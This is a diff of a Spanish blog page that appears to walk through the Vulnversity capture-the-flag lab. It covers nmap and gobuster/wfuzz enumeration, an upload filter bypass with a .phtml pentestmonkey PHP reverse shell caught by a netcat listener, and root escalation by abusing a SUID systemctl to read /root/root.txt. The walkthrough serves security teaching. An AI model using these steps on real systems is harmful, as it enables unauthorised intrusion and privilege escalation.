@@ -380,6 +380,20 @@ if (!doNotTrack) {
         
 
         
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    7 minutos a leer
+                </time>
+            </div>
+        
     </footer>
     
 
@@ -466,60 +480,119 @@ if (!doNotTrack) {
 </tbody>
 </table></div>
 <h3 id="escanea-la-máquina-cuántos-puertos-están-abiertos">Escanea la máquina, ¿cuántos puertos están abiertos?</h3>
-<pre><code>❯ nmap -p- 10.10.23.174
-
-PORT     STATE SERVICE
-21/tcp   open  ftp
-22/tcp   open  ssh
-139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds
-3128/tcp open  squid-http
-3333/tcp open  dec-notes
-</code></pre>
-<p>Tiene un total de 6 puertos abiertos</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ nmap -p- 10.10.23.174
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
+</span></span><span class="line"><span class="cl">3128/tcp open  squid-http
+</span></span><span class="line"><span class="cl">3333/tcp open  dec-notes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tiene un total de 6 puertos abiertos</p>
 <h3 id="qué-versión-del-proxy-se-está-ejecutando-en-la-máquina">¿Qué versión del proxy se está ejecutando en la máquina?</h3>
-<pre><code>❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174
-
-PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 3.0.3
-22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-3128/tcp open  http-proxy  Squid http proxy 3.5.12
-3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
-Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
-<p>En el puerto 3128 se puede ver la version de la proxy <code>3.5.12</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp         vsftpd 3.0.3
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+</span></span><span class="line"><span class="cl">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+</span></span><span class="line"><span class="cl">3128/tcp open  http-proxy  Squid http proxy 3.5.12
+</span></span><span class="line"><span class="cl">3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+</span></span><span class="line"><span class="cl">Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En el puerto 3128 se puede ver la version de la proxy <code>3.5.12</code></p>
 <h3 id="cuántos-puertos-escaneará-nmap-si-se-usó-la-bandera--p-400">¿Cuántos puertos escaneará nmap si se usó la bandera -p-400?</h3>
 <p>Como se indica en el parámetro (-p-400), Escaneara 400 puertos</p>
 <h3 id="usando-el-indicador-nmap--n-qué-no-resolverá">Usando el indicador nmap -n, ¿qué no resolverá?</h3>
 <p>Con él <code>-n</code> no hacer DNS</p>
 <h3 id="cuál-es-el-sistema-operativo-más-probable-que-esté-ejecutando-esta-máquina">¿Cuál es el sistema operativo más probable que esté ejecutando esta máquina?</h3>
-<pre><code>❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174
-
-PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 3.0.3
-22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-3128/tcp open  http-proxy  Squid http proxy 3.5.12
-3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
-Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
-<p>En el puerto 3333 indica que es un Ubuntu</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp         vsftpd 3.0.3
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+</span></span><span class="line"><span class="cl">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+</span></span><span class="line"><span class="cl">3128/tcp open  http-proxy  Squid http proxy 3.5.12
+</span></span><span class="line"><span class="cl">3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+</span></span><span class="line"><span class="cl">Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En el puerto 3333 indica que es un Ubuntu</p>
 <h3 id="en-qué-puerto-se-está-ejecutando-el-servidor-web">¿En qué puerto se está ejecutando el servidor web?</h3>
-<pre><code>❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174
-
-PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 3.0.3
-22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-3128/tcp open  http-proxy  Squid http proxy 3.5.12
-3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
-Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
-<p>El servidor web se está ejecutando por el puerto 3333</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp         vsftpd 3.0.3
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+</span></span><span class="line"><span class="cl">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+</span></span><span class="line"><span class="cl">3128/tcp open  http-proxy  Squid http proxy 3.5.12
+</span></span><span class="line"><span class="cl">3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+</span></span><span class="line"><span class="cl">Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>El servidor web se está ejecutando por el puerto 3333</p>
 <h2 id="localizando-subdirectorios">Localizando subdirectorios</h2>
 <p>Para esta parte vamos a buscar directorios con <code>gobuster</code> y <code>wfuzz</code> usando el diccionario <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
 <h3 id="cuál-es-el-directorio-que-tiene-una-página-de-formulario-de-carga">¿Cuál es el directorio que tiene una página de formulario de carga?</h3>
@@ -559,18 +632,33 @@ Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_ke
 </tr>
 </tbody>
 </table></div>
-<pre><code class="language-bash">❯ gobuster dir -u http://10.10.23.174:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-===============================================================
-2022/12/18 01:37:49 Starting gobuster in directory enumeration mode
-===============================================================
-/images               (Status: 301) [Size: 320] [--&gt; http://10.10.23.174:3333/images/]
-/css                  (Status: 301) [Size: 317] [--&gt; http://10.10.23.174:3333/css/]
-/js                   (Status: 301) [Size: 316] [--&gt; http://10.10.23.174:3333/js/]
-/fonts                (Status: 301) [Size: 319] [--&gt; http://10.10.23.174:3333/fonts/]
-/internal             (Status: 301) [Size: 322] [--&gt; http://10.10.23.174:3333/internal/]
-</code></pre>
-<p>Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: <code>internal</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ gobuster dir -u http://10.10.23.174:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2022/12/18 01:37:49 Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/images/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/css/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/js/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/fonts/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/internal             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 322<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/internal/<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: <code>internal</code></p>
 <h4 id="wfuzz">wfuzz</h4>
 <p>Wfuzz fue creado para facilitar la tarea en las evaluaciones contra aplicaciones web, y está basado en un concepto simple; reemplaza cualquier referencia a la palabra clave FUZZ, por el valor del payload (carga útil) definido.</p>
 <p>Un payload en Wfuzz es una fuente de datos.</p>
@@ -607,18 +695,33 @@ Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_ke
 </tr>
 </tbody>
 </table></div>
-<pre><code class="language-bash">❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.23.174:3333/FUZZ
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                     
-=====================================================================
-000000550:   301        9 L      28 W       317 Ch      &quot;css&quot;                                                                                                                       
-000000953:   301        9 L      28 W       316 Ch      &quot;js&quot;                                                                                                                        
-000002771:   301        9 L      28 W       319 Ch      &quot;fonts&quot;                                                                                                                     
-000002984:   301        9 L      28 W       322 Ch      &quot;internal&quot;
-000095524:   403        11 L     32 W       302 Ch      &quot;server-status&quot;
-</code></pre>
-<p>Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: <code>internal</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.23.174:3333/FUZZ
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>                                                                                                                     
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">000000550:   <span class="m">301</span>        <span class="m">9</span> L      <span class="m">28</span> W       <span class="m">317</span> Ch      <span class="s2">&#34;css&#34;</span>                                                                                                                       
+</span></span><span class="line"><span class="cl">000000953:   <span class="m">301</span>        <span class="m">9</span> L      <span class="m">28</span> W       <span class="m">316</span> Ch      <span class="s2">&#34;js&#34;</span>                                                                                                                        
+</span></span><span class="line"><span class="cl">000002771:   <span class="m">301</span>        <span class="m">9</span> L      <span class="m">28</span> W       <span class="m">319</span> Ch      <span class="s2">&#34;fonts&#34;</span>                                                                                                                     
+</span></span><span class="line"><span class="cl">000002984:   <span class="m">301</span>        <span class="m">9</span> L      <span class="m">28</span> W       <span class="m">322</span> Ch      <span class="s2">&#34;internal&#34;</span>
+</span></span><span class="line"><span class="cl">000095524:   <span class="m">403</span>        <span class="m">11</span> L     <span class="m">32</span> W       <span class="m">302</span> Ch      <span class="s2">&#34;server-status&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: <code>internal</code></p>
 <h2 id="comprometer-el-servidor-web">Comprometer el servidor web</h2>
 <h2 id="qué-tipo-de-archivo-común-que-le-gustaría-cargar-para-explotar-el-servidor-está-bloqueado-prueba-un-par-para-averiguarlo">¿Qué tipo de archivo común, que le gustaría cargar para explotar el servidor, está bloqueado? Prueba un par para averiguarlo.</h2>
 <p>La respuesta es <code>.php</code></p>
@@ -667,36 +770,95 @@ ID           Response   Lines    Word       Chars       Payload
 <h3 id="cuál-es-el-nombre-del-usuario-que-administra-el-servidor-web">¿Cuál es el nombre del usuario que administra el servidor web?</h3>
 <p>Viendo que podemos subir .phtml vamos a mandarle un archivo para crear una reverse shell, vamos a usar <a class="link" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"  target="_blank" rel="noopener"
     >https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</a> de pentestmonkey</p>
-<pre><code class="language-bash"># Nos lo pasamos a nuestra máquina
-wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-
-# Le cambiamos la extensión
-mv php-reverse-shell.php php-reverse-shell.phtml
-</code></pre>
-<p>Importante cambiar estas líneas</p>
-<pre><code class="language-php">$ip = '127.0.0.1';  // Ip de tú máquina
-$port = 1234;       // Puerto en el que te vas a poner en escucha
-</code></pre>
-<p>Nos ponemos en escucha por el puerto 443 con netcat</p>
-<pre><code>nc -nlvp 443
-</code></pre>
-<p>Ahora ya podemos ejecutar el archivo poniendo lo siguiente en el navegador</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nos lo pasamos a nuestra máquina</span>
+</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Le cambiamos la extensión</span>
+</span></span><span class="line"><span class="cl">mv php-reverse-shell.php php-reverse-shell.phtml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Importante cambiar estas líneas</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>  <span class="c1">// Ip de tú máquina
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$port</span> <span class="o">=</span> <span class="mi">1234</span><span class="p">;</span>       <span class="c1">// Puerto en el que te vas a poner en escucha
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nos ponemos en escucha por el puerto 443 con netcat</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -nlvp 443
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ahora ya podemos ejecutar el archivo poniendo lo siguiente en el navegador</p>
 <p>http://10.10.23.174:3333/internal/uploads/php-reverse-shell.phtml</p>
 <p>Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p>
-<pre><code class="language-bash">script /dev/null -c bash
-</code></pre>
-<p>ctrl + z</p>
-<pre><code class="language-bash">stty raw -echo; fg
-</code></pre>
-<pre><code class="language-bash">reset
-</code></pre>
-<pre><code class="language-bash">xterm
-</code></pre>
-<pre><code class="language-bash">export SHELL=bash
-</code></pre>
-<pre><code class="language-bash">export TERM=xterm
-</code></pre>
-<p>Ahora en /home/bill/user.txt ya podemos ver la flag y ya sabemos que el nombre de quien administra el servidor web es bill</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ctrl + z</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reset
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xterm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ahora en /home/bill/user.txt ya podemos ver la flag y ya sabemos que el nombre de quien administra el servidor web es bill</p>
 <h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
 <p>En Linux, SUID (establecer el ID de usuario del propietario en la ejecución) es un tipo especial de permiso de archivo otorgado a un archivo. SUID otorga permisos temporales a un usuario para ejecutar el programa/archivo con el permiso del propietario del archivo (en lugar del usuario que lo ejecuta).</p>
 <p>Por ejemplo, el archivo binario para cambiar su contraseña tiene el bit SUID (/usr/bin/passwd). Esto se debe a que para cambiar su contraseña, deberá escribir en el archivo shadowers al que no tiene acceso, root sí, por lo que tiene privilegios de root para realizar los cambios correctos.</p>
@@ -704,18 +866,37 @@ $port = 1234;       // Puerto en el que te vas a poner en escucha
 <p>Con <code>find / -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code> podemos ver los archivos con permisos suid. La respuesta es /bin/systemctl</p>
 <h3 id="conviértase-en-root-y-obtenga-la-última-flag-rootroottxt">Conviértase en root y obtenga la última flag (/root/root.txt)</h3>
 <p>Ejecutando lo siguiente y después haciendo un cat a /tmp/output podemos ver la flag</p>
-<pre><code class="language-bash">TF=$(mktemp).service
-echo '[Service]
-Type=oneshot
-ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output&quot;
-[Install]
-WantedBy=multi-user.target' &gt; $TF
-/bin/systemctl link $TF
-/bin/systemctl enable --now $TF
-</code></pre>
-<pre><code class="language-bash">cat /tmp/output
-</code></pre>
-
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;[Service]
+</span></span></span><span class="line"><span class="cl"><span class="s1">Type=oneshot
+</span></span></span><span class="line"><span class="cl"><span class="s1">ExecStart=/bin/sh -c &#34;cat /root/root.txt &gt; /tmp/output&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">[Install]
+</span></span></span><span class="line"><span class="cl"><span class="s1">WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$TF</span>
+</span></span><span class="line"><span class="cl">/bin/systemctl link <span class="nv">$TF</span>
+</span></span><span class="line"><span class="cl">/bin/systemctl <span class="nb">enable</span> --now <span class="nv">$TF</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /tmp/output
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
@@ -746,6 +927,30 @@ WantedBy=multi-user.target' &gt; $TF
     <h2 class="section-title">Contenidos relacionados</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-wonderland/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-wonderland/images/portada.544990aae9de59c8a413955875bee210.png" 
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Wonderland"
+                        
+                        data-hash="md5-VEmQquneWcikE5VYdb7iEA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Wonderland</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -838,30 +1043,6 @@ WantedBy=multi-user.target' &gt; $TF
 
         <div class="article-details">
             <h2 class="article-title">Resolución Tomghost</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/resoluci%C3%B3n-wgel/">
-        
-        
-            <div class="article-image">
-                <img src="/p/resoluci%C3%B3n-wgel/images/2.ce0967ca6b0dead5b9edaef85b680e16.png" 
-                        width="1914" 
-                        height="874" 
-                        loading="lazy"
-                        alt="Featured image of post Resolución Wgel"
-                        
-                        data-hash="md5-zglnymsN6tW57a74W2gOFg==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Resolución Wgel</h2>
         </div>
     </a>
 </article>
